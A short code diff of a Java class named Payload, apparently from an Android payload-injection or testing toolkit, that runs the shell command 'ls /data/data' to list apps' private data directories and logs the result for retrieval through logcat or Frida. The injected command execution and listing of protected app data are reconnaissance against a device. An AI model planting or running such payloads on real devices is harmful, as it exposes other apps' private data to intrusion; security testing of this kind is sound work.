@@ -1,17 +1,25 @@
 package payloads_source;
 
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+
 public class Payload {
     public void execute() {
         try {
-            // Replace this with any code you want executed
+            StringBuilder output = new StringBuilder();
             Process process = Runtime.getRuntime().exec("ls /data/data");
-            java.io.BufferedReader reader = new java.io.BufferedReader(
-                new java.io.InputStreamReader(process.getInputStream())
+
+            BufferedReader reader = new java.io.BufferedReader(
+                new InputStreamReader(process.getInputStream())
             );
+
             String line;
             while ((line = reader.readLine()) != null) {
-                System.out.println("[Payload] " + line);
+                output.append(line).append("\n");
             }
+
+            // Print output to system log (retrievable via logcat or Frida)
+            System.out.println("[Payload Output]\n" + output.toString());
         } catch (Exception e) {
             e.printStackTrace();
         }
